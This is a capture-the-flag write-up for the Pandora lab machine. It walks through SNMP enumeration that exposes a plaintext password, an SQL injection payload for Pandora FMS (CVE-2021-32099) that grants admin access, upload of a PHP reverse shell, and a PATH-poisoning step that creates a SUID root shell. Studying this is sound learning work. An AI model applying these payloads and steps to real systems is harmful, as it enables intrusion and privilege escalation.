In This Box we are going to enumerate the snmp port which will show user daniel with his password as a string in the output , we are going to login with ssh to him and will see there is another user matt which has the user.txt , after some enumeration we will see there is pandora fms running internally with user matt , we will port forward to exploit the vulnerable service then we will abuse a path poisoning in a custom binary for the root access

# Scanning :

initial scan :

```bash
nmap -sV -A -T 4 $IP -oN nmap/intial.txt

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:

```

And i have learned the lesson from previous machines so will scan udp as well just in case

```bash
sudo nmap -sV -sU  10.10.11.136

PORT      STATE    SERVICE VERSION
161/udp   open     snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
17219/udp filtered chipper
17989/udp filtered unknown
46532/udp filtered unknown
```

# Enumeration :

- port 80 : the web page :

![error](/assets/images/pandora/20220120195335.png)

there is only this form where we can send data , parameters are :

```cmd
fullName=ADam&email=adma@testet.com&phone=a&message=a
```

testing them for sqli , ssti and more found out this is just a rabbit Hole :'')

- we have found in the udp scan **snmp** is open so let's enumerate it , trying to enumerate with the community string "public" it works and we got results :

```bash
snmpwalk -c public -v1 10.10.11.136 > snmpwalk.out
```

you can query about one thing with `snmpwalk` But i want to see all the data , finally will see this in the output

```bash
iso.3.6.1.2.1.25.4.2.1.5.3068 = STRING: "-u daniel -p HotelBabylon23"
```

so we have a potential username and a password , we can try ssh with it :

```bash
ssh daniel@10.10.11.136
```

# Foothold :

i have logged in with `daniel` However user `matt` is the one contains the `user.txt` and he only can read it

we need to escalate to `matt` then `root`

![error](/assets/images/pandora/20220521124027.png)

after a lot of enumeration we will see :

![error](/assets/images/pandora/20220521124108.png)

the web page we have seen above is for the `html` But what about `pandora` ?

![error](/assets/images/pandora/20220521112241.png)

and we will see it is owned by the user `matt` which we are targeting.

![error](/assets/images/pandora/20220521123919.png)

so it seems we need to do **Port forwarding** to interact with this page at the Browser.

```bash
# @ your side
sudo ssh -N -L 0.0.0.0:9999:127.0.0.1:80 daniel@10.10.11.136
```

that will let us see this web page at `http://127.0.0.1:9999`

![error](/assets/images/pandora/20220120200414.png)

and we can see the version at the bottom of the page : **`v7.0NG.742_FIX_PERL2020`**

searching for Vulnerabilities for this version will find **`CVE-2021-32099`** which is SQL injection in the session_id , and the payload is [here](https://github.com/ibnuuby/CVE-2021-32099) and it is explained in the blog [here](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained)

```bash
http://127.0.0.1:9999/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1
```

all we need to do is to go back to **`http://127.0.0.1:9999/pandora_console/`**
and we will have admin access as the admin cookie has been added

![error](/assets/images/pandora/20220120200737.png)

Hence the site works with **PHP** we can know that from **wappalayzer** extension, so we need to upload a php reverse shell .

It is located at `/usr/share/webshells/php/php-reverse-shell.php` in Linux or you can download it [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) By watching [here](https://www.youtube.com/watch?v=KX_jZsdgsJE&ab_channel=k4m1ll0-hackingchannel) we need to zip it then we can execute it at **`/pandora_console/extensions/shell.php`**

upload it at

```bash
admin tools > extensions manager > extension uploader
```

Then set your listener and will get the shell after execute it at
`/pandora_console/extensions/shell.php`

![error](/assets/images/pandora/20220120204254.png)

Once we are in we can generate ssh keys to get a stable shell

```bash
kali@kali:~$ ssh-keygen -f pandora
```

- normally we 'd use

```bash
ssh-copy-id -i pandora.pub matt@10.10.11.136
```

But hence we don't know matt's password , we would copy our key manually and add it to `authorized_keys` at matt's side

now copy `pandora.pub` into `authorized_keys` at the target machine , you can connect now:

```bash
kali@kali:~$  ssh matt@10.10.11.136 -i pandora
```

# Privilege escalation

Searching for SUID binaries found :

![error](/assets/images/pandora/20220521121149.png)

The `/usr/bin/pandora_backup` seems odd , we can explore it with **strings** but it is not installed on the box , we can move it to our side and explore it or Just try `strace` first

```bash
strace /usr/bin/pandora_backup
```

we can see in the output :

```bash
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
```

it seems it uses `tar` command without providing Full path so that may let us do **Path Poisoning** .

```bash
echo "cp /bin/bash /tmp/bash ; chmod +s /tmp/bash" > tar
chmod 777 tar
export PATH=.:$PATH
```
